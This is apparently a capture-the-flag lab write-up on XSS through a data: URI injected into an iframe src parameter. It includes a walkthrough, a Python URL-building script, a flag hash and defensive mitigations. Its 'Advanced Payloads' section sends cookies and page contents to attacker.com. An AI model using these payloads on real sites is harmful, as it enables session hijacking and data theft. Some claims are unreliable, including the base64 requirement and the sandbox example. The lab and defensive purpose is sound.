# XSS via iframe `src` — Professional Exploit Guide

> **LinkedIn:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)

---

## Learning Objectives

- DOM-based / Reflected XSS via `iframe src` injection
- Data URI encoding with base64
- JavaScript payload construction
- Cookie theft techniques
- DOM manipulation and same-origin policy exploitation

---

## Required Tools

| Tool | Purpose |
|------|---------|
| `Burp Suite` | Request interception and replay |
| `Browser DevTools` | DOM inspection, console output |
| `base64` | Encode/decode payloads |
| `curl` | Command-line HTTP requests |
| `Python 3` | Payload automation |

---

## Prerequisites

- Understanding of JavaScript and the browser DOM
- Knowledge of the same-origin policy
- Familiarity with the browser security model and content policies
- Basic HTML and HTTP knowledge

---

## Vulnerability Overview

| Property | Value |
|----------|-------|
| **Parameter** | `src` (iframe source URL) |
| **Endpoint** | `/?page=media&src=<input>` |
| **Vulnerability** | Reflected XSS — DOM-based (CWE-79) |
| **CVSS Score** | 8.2 (High) |
| **Impact** | Session hijacking, credential theft, arbitrary script execution |

The application injects the `src` query parameter directly into an `<iframe>` element without any sanitization or Content Security Policy:

```html
<!-- Vulnerable server-side rendering -->
<iframe src="<?php echo $_GET['src']; ?>"></iframe>
```

An attacker supplies a `data:text/html;base64,<payload>` URI. The browser fetches and renders the data URI, executing arbitrary JavaScript in the page context.

---

## Step-by-Step Exploitation

### Step 1 — Identify the iframe `src` Injection Point

Visit the media page and observe that the `src` parameter is reflected verbatim:

```
GET /?page=media&src=noscript
```

Use browser DevTools (Elements tab) or `curl` to confirm the value appears inside `<iframe src="...">`.

---

### Step 2 — Craft a JavaScript Payload

Write a script to demonstrate execution:

```javascript
<script>alert("XSS")</script>
```

For cookie exfiltration:

```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

---

### Step 3 — Base64-Encode the Payload

Browsers refuse to execute inline scripts in `data:text/html` URIs unless they are base64-encoded within a proper data URI:

```bash
PAYLOAD='<script>alert("Hacked")</script>'
echo -n "$PAYLOAD" | base64
# → PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=
```

---

### Step 4 — Construct the `data:` URI

Combine the scheme, MIME type, encoding, and payload:

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=
```

---

### Step 5 — Inject and Execute in the Browser

Navigate to:

```
http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=
```

The browser renders the iframe with the data URI, executing the embedded JavaScript.

---

### Step 6 — Extract Sensitive Data from the DOM

The challenge page reveals the flag in an alert dialog triggered by the payload. Check the browser's alert/console output or inspect the response HTML:

```bash
curl -s "http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=" \
  | grep -i flag
```

---

### Step 7 — Retrieve the Flag

**Flag:** `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

---

## Python Automation Script

```python
#!/usr/bin/env python3
"""
Automates XSS iframe payload generation, encoding, and URL construction.
"""
import base64
import urllib.parse
import requests
import re
import sys

def generate_xss_url(base_url: str, payload: str) -> str:
    """Encode a JS payload as a data URI and build the injection URL."""
    encoded = base64.b64encode(payload.encode()).decode()
    data_uri = f"data:text/html;base64,{encoded}"
    params = urllib.parse.urlencode({"page": "media", "src": data_uri})
    return f"{base_url.rstrip('/')}/index.php?{params}"

def detect_xss(base_url: str, payload: str) -> bool:
    """Return True if the injected payload is reflected in the response."""
    url = generate_xss_url(base_url, payload)
    resp = requests.get(url, timeout=10)
    encoded = base64.b64encode(payload.encode()).decode()
    return encoded in resp.text

def extract_flag(html: str) -> str | None:
    """Extract a 64-character hex flag from HTML."""
    m = re.search(r'\b[0-9a-fA-F]{64}\b', html)
    return m.group(0).lower() if m else None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    payload = '<script>alert("XSS")</script>'

    url = generate_xss_url(target, payload)
    print(f"[*] Injection URL:\n    {url}\n")

    resp = requests.get(url, timeout=10)
    flag = extract_flag(resp.text)
    if flag:
        print(f"[+] Flag found: {flag}")
    else:
        print("[*] Flag not in response — open URL in browser to trigger alert.")
```

**Usage:**

```bash
python3 xss_payload.py http://localhost:8080
```

---

## Advanced Payloads

### Cookie Stealing

```javascript
<script>
  new Image().src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Base64-encoded for injection:

```bash
echo -n '<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>' | base64
```

### Admin Panel Access Probe

```javascript
<script>
  fetch('/admin').then(r => r.text()).then(t => fetch('http://attacker.com/?d=' + btoa(t)));
</script>
```

### Data Exfiltration via XHR

```javascript
<script>
  var x = new XMLHttpRequest();
  x.open('GET', '/secret', true);
  x.onload = function() { document.location = 'http://attacker.com/?d=' + btoa(x.responseText); };
  x.send();
</script>
```

---

## Defensive Mitigations

### 1. HTML Entity Encoding of User Input

```php
<?php
// Always encode before inserting into HTML attributes
$src = htmlspecialchars($_GET['src'] ?? '', ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<iframe src=\"{$src}\"></iframe>";
```

### 2. Content Security Policy (CSP) Headers

```php
<?php
// Prevent inline scripts and restrict frame sources
header("Content-Security-Policy: default-src 'self'; script-src 'self'; frame-src 'self' https:;");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: SAMEORIGIN");
```

### 3. DOMPurify Sanitization (Client-Side)

```html
<!-- Load DOMPurify and sanitize before inserting into DOM -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
<script>
  var raw = new URLSearchParams(location.search).get('src') || '';
  var clean = DOMPurify.sanitize(raw, { ALLOWED_TAGS: [] }); // strip all tags
  document.getElementById('preview').src = clean;
</script>
```

### 4. iframe `sandbox` Attribute

```html
<!-- Disable scripts and same-origin access inside iframes -->
<iframe sandbox="allow-same-origin" src="<?php echo $src; ?>"></iframe>
```

### 5. Input Allowlist — Only Permit Known Safe Schemes

```php
<?php
function is_safe_src(string $src): bool {
    $parsed = parse_url($src);
    $scheme = strtolower($parsed['scheme'] ?? '');
    $allowed_schemes = ['http', 'https'];
    return in_array($scheme, $allowed_schemes, true);
}

$src = $_GET['src'] ?? '';
if (!is_safe_src($src)) {
    http_response_code(400);
    exit('Invalid source URL.');
}
```

---

## Key Takeaways

1. **Never reflect user input into HTML attributes** without proper escaping.
2. **`data:` URIs** allow arbitrary HTML/JavaScript execution — block them with CSP `frame-src`.
3. **Content Security Policy** is the strongest single defense against XSS.
4. **`sandbox` on iframes** limits what injected content can do even if CSP is misconfigured.
5. **Server-side allowlisting** of URL schemes eliminates the entire `data:` injection vector.

---

## References & Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — Cross-Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---

> **Author:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)
